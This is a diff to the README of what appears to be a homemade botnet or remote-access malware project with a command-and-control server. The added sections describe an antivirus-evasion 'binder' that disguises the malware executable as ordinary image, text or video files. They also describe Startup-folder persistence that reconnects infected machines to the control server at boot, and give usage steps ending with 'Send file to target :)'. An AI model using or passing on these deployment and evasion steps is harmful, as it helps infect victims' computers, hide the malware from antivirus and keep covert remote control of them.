@@ -33,7 +33,10 @@ It is multithreaded and has 3 main thread functions **BotHandler, BotCmd, Pinger
 We added some functions such as checking for alive hosts by pinging them continously in another thread.  
 The active hosts are saved in the **active_hosts.csv** file while the server is running and is deleted automatically after it stops as there were some inconsistency issues.  
 
-PS: The exe size is less than 1 MB.
+As an AV evasion mechanism we built a python based binder that binds our malware with any regular jpg ,jpeg ,txt or mp4 file.
+Whenever the infected file is opened our malware replicates itself to "Windows\\Start Menu\\Programs\\Startup" in background to ensure that the malware is able to connect back to Control Server each time the machine is booted. 
+
+PS: The malware exe size is less than 1 MB.
 
 ### List of Commands :  
 - whoami
@@ -99,6 +102,27 @@ Finally we can get a static executable with :
 Additionally we can strip out symbols with the `-s` flag in the above cmd.  
 
 ***
+## Binder
+
+After you get a static executable you will have to bind the malicious payload with a regular file
+
+For `bind.py` just install modules from requirements.txt  
+`pip install -r requirements.txt`
+
+USAGE :
+
+`python binder.py`
+
+    Enter path of regular file (Enter)
+
+    Enter path of malicious payload you want bind (Enter)
+
+Your binded exe file is ready in /dist folder
+
+Use sourcehack to check icon
+
+Send file to target :)
+
 ## VirusTotal Results
 
 I know I shouldn't have uploaded it but I was just curious.  
